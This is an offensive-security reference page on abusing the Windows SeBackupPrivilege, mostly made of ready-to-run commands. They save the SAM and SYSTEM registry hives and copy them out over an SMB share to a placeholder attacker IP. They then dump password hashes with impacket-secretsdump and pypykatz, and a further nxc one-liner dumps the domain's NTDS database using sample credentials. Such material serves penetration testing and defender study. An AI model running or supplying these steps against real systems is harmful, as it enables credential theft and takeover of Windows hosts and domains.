# SeBackupPrivilege

A Windows privilege that allows **bypassing standard ACL checks** to read files and registry hives during backup operations. Assigned by default to `Administrators`, [`Backup Operators`](../groups/backup-operators.md), and `Server Operators` but **disabled in user tokens by default**.&#x20;

Backup-aware tools (e.g., `reg.exe`, `robocopy`, `ntbackup`) explicitly enable this privilege at runtime to access protected objects regardless of ACLs.

## Exploitation

{% hint style="info" %}
For **AD exploitation** check [Backup Operators](../groups/backup-operators.md#exploitation), [Server Operators](../groups/server-operators.md#exploitation).
{% endhint %}

{% tabs %}
{% tab title="Dump" %}
Move to a [writeable directory](../../infra/os/windows/host-recon.md#writable-directories) and copy the hives:

```powershell
# Move to a writeable directory
cd c:\windows\temp

# Copy the SAM and SYSTEM hives
reg save hklm\sam c:\windows\temp\sam
reg save hklm\system c:\windows\temp\system
```

Transfer the hives to the attacking host (preferrable via SMB and not WinRM):

```bash
# Start an SMB server
sudo impacket-smbserver share -smb2support / -user test -password test
```

Connect and copy the hives:

```powershell
# Connect to the share
net use z: \\<attacker-IP>\share /user:test test

# Copy the hives
copy sam z:\
copy system z:\
```

Dump the creds on the attacking host:

```bash
# Dump creds with impacket
impacket-secretsdump -sam sam -system system LOCAL

# Dump creds with pypykatz
pypykatz registry --sam sam system
```
{% endtab %}

{% tab title="nxc" %}
If the credentials of the `Backup Operators`'s member are available:

```bash
nxc smb 192.168.210.16 -u administrator -p Password123! --ntds vss
```
{% endtab %}
{% endtabs %}
